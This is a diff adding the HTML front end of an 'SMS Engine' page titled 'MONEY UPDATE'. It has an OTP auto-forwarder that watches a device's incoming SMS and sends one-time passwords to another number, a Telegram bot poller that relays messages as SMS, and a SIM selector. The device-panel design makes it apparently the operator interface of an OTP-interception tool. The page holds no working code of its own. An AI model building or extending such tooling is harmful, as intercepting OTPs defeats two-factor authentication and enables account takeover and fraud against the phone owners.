@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>MONEY UPDATE - SMS Engine</title>
+  <link rel="icon" type="image/svg+xml" href="favicon.svg" />
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="engine.css">
+</head>
+<body>
+  <div class="engine-container">
+    <header class="engine-header">
+      <div class="header-left">
+        <button class="btn-back" onclick="window.close()">← Back to Panel</button>
+        <h1>⚡ SMS ENGINE</h1>
+      </div>
+      <div class="header-right">
+        <span class="device-tag" id="device-tag">No Device</span>
+      </div>
+    </header>
+
+    <div class="cards-grid">
+      <!-- OTP Auto-Forwarder Card -->
+      <div class="card otp-card">
+        <div class="card-header">
+          <span class="card-icon">📨</span>
+          <h2>OTP AUTO-FORWARDER</h2>
+        </div>
+        <p class="card-desc">Watches incoming SMS in real-time. When an OTP message is detected it is instantly forwarded from this device.</p>
+        
+        <div class="form-group">
+          <label>Forward OTPs to Number</label>
+          <input type="text" id="otp-forward-number" placeholder="Enter phone number (e.g. 8140757701)">
+        </div>
+        
+        <div class="form-group">
+          <label>OTP Pattern (regex)</label>
+          <input type="text" id="otp-pattern" value="\\b\\d{4,8}\\b" placeholder="\\b\\d{4,8}\\b">
+          <small>Matches: XXXXX is your one time password, Your OTP is, verification code, etc.</small>
+        </div>
+
+        <div class="device-info-row">
+          <span class="info-label">Device:</span>
+          <span class="info-value" id="device-info">Loading...</span>
+        </div>
+      </div>
+
+      <!-- Telegram Bot Poller Card -->
+      <div class="card tg-card">
+        <div class="card-header">
+          <span class="card-icon">🤖</span>
+          <h2>TELEGRAM BOT POLLER</h2>
+        </div>
+        <p class="card-desc">Polls a Telegram bot every 3 seconds. New messages from the target chat are sent as SMS from this device.</p>
+        
+        <div class="form-group">
+          <label>Bot Token</label>
+          <input type="text" id="bot-token" placeholder="1234567890:AAEZJP...">
+        </div>
+        
+        <div class="form-group">
+          <label>Chat ID (group id, e.g. -1001234567890 or @username)</label>
+          <input type="text" id="chat-id" placeholder="-1001234567890">
+        </div>
+        
+        <div class="form-group">
+          <label>Forward Telegram msgs to Number (leave blank to use OTP number)</label>
+          <input type="text" id="tg-forward-number" placeholder="+91XXXXXXXXXX">
+        </div>
+
+        <button class="btn-test" onclick="testTelegramConnection()">🔍 TEST CONNECTION</button>
+      </div>
+    </div>
+
+    <div class="control-bar">
+      <div class="sim-selector">
+        <label>Execution SIM</label>
+        <select id="exec-sim">
+          <option value="0">SIM 1</option>
+          <option value="1">SIM 2</option>
+        </select>
+      </div>
+      <button class="btn-engine" id="engine-btn" onclick="toggleEngine()">▶ START ENGINE</button>
+    </div>
+
+    <div class="status-bar">
+      <div class="status-info">
+        <span class="status-label">Engine Status:</span>
+        <span class="status-value" id="status-value">IDLE</span>
+      </div>
+      <p class="status-desc" id="status-desc">Starting the engine primes the OTP watcher and begins Telegram polling if configured</p>
+      <button class="btn-clear" onclick="clearLog()">CLEAR</button>
+    </div>
+
+    <div class="activity-log">
+      <div class="log-header">
+        <span class="log-icon">⚡</span>
+        <h3>Activity Log</h3>
+      </div>
+      <div id="log-container" class="log-container">
+        <p class="log-empty">No activity yet — start the engine and wait for messages</p>
+      </div>
+    </div>
+  </div>
+
+  <script src="engine.js"></script>
+</body>
+</html>
